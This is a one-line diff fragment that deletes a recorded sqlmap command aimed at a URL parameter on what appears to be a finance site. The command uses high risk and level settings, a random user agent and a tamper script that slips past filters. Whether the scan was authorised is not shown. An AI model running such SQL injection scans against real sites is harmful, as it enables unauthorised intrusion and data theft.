@@ -1,1 +1,0 @@
-https://ngoenmun.com/?page=1 (GET)  # C:\Users\Administrator\AppData\Local\Programs\Python\Python311\Scripts\sqlmap -u https://ngoenmun.com/?page=1 --batch --level=3 --risk=3 --random-agent --tamper=space2comment --output-dir sqlmap_evidence_20251029_022659\NgoenMun_Finance --fresh-queries
